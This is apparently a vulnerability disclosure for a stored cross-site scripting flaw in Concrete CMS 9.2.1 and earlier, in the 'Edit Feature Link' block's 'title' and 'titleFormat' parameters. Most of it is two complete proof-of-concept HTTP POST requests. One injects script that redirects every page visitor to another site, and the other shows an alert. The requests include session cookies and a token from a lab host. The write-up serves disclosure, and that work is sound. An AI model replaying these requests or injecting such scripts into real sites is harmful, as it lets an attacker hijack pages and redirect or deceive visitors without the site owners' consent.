BUG_Author:
LJWIIE

Affected version:
Concrete CMS versions 9.2.1 and earlier

Vendor:
https://www.concretecms.org/

Software:

https://www.concretecms.org/download

https://github.com/concretecms/concretecms/releases/tag/9.2.1

Vulnerability File:
index.php/ccm/system/dialogs/block/edit.php, function submit()

Description:

In Concrete CMS versions 9.2.1 and earlier, authenticated users can execute Stored Cross-Site Scripting (XSS) attacks by combining the "titleFormat" and "title" parameters within the "Edit Feature Link" function. This combination may lead to harmful actions such as redirects, unwanted ads, and executing malicious HTML code, posing risks to visitors and the site's integrity.

Status: Medium

POST parameter 'titleFormat' and 'title' together contain a Stored Cross-Site Scripting (XSS) vulnerability.

[**Redirect to Google official website**]Payload1:

```html
POST /concretecms/index.php/ccm/system/dialogs/block/edit/submit?ccm_token=1695469065:5aa63bbe62ffcb4df09a6763873c46be&cID=1&arHandle=Main+%3A+3+%3A+Column+2&bID=1659 HTTP/1.1
Host: 192.168.157.135
Content-Length: 1821
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoglzy1CW1rAJNDGp
Origin: http://192.168.157.135
Referer: http://192.168.157.135/concretecms/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CONCRETE=ec85avj4ojkan1mrh5g6dhrn76; CONCRETE_LOGIN=1
Connection: close

------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="title"

window.onload = function() {window.location.href = 'https://www.google.com';};
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="titleFormat"

script
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="body"

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas varius tortor nibh, sit amet tempor nibh finibus et. Aenean eu enim justo.</p>

------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="fID"

0
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="buttonText"

Learn More
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="buttonSize"

lg
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="buttonStyle"

outline
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="buttonColor"

primary
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="icon"


------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="imageLink__which"

none
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="imageLink_page"

0
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="imageLink_file"

0
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="imageLink_external_url"


------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="ccm-edit-block-submit"

submit
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="__ccm_consider_request_as_xhr"

1
------WebKitFormBoundaryoglzy1CW1rAJNDGp--
```

![image](https://github.com/IIE-Safety/title_And_titleFormat/assets/65028436/926b6fa4-370b-4532-8b0b-45d3971c1fd1)

Once edited and saved, anyone visiting this page will be forced to visit the Google website. Below is a gif showing it.

![RedirectToGoogle](https://github.com/IIE-Safety/StoredXSS_BODY/assets/65028436/3d2ed4e1-abec-4053-8166-5bdf198de7bd)

[**Display alert window**]Payload2:

```html
POST /concretecms/index.php/ccm/system/dialogs/block/edit/submit?ccm_token=1695469065:5aa63bbe62ffcb4df09a6763873c46be&cID=1&arHandle=Main+%3A+3+%3A+Column+2&bID=1659 HTTP/1.1
Host: 192.168.157.135
Content-Length: 1821
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoglzy1CW1rAJNDGp
Origin: http://192.168.157.135
Referer: http://192.168.157.135/concretecms/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CONCRETE=ec85avj4ojkan1mrh5g6dhrn76; CONCRETE_LOGIN=1
Connection: close

------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="title"

alert("You have been hacked!")
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="titleFormat"

script
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="body"

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas varius tortor nibh, sit amet tempor nibh finibus et. Aenean eu enim justo.</p>

------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="fID"

0
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="buttonText"

Learn More
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="buttonSize"

lg
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="buttonStyle"

outline
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="buttonColor"

primary
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="icon"


------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="imageLink__which"

none
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="imageLink_page"

0
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="imageLink_file"

0
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="imageLink_external_url"


------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="ccm-edit-block-submit"

submit
------WebKitFormBoundaryoglzy1CW1rAJNDGp
Content-Disposition: form-data; name="__ccm_consider_request_as_xhr"

1
------WebKitFormBoundaryoglzy1CW1rAJNDGp--
```

![image](https://github.com/IIE-Safety/title_And_titleFormat/assets/65028436/dacf7c66-9329-4593-8f9c-91bd9ca0a335)

![image](https://github.com/IIE-Safety/StoredXSS_BODY/assets/65028436/aa0a61ad-c1c2-4903-8019-a1fa9a4f060c)

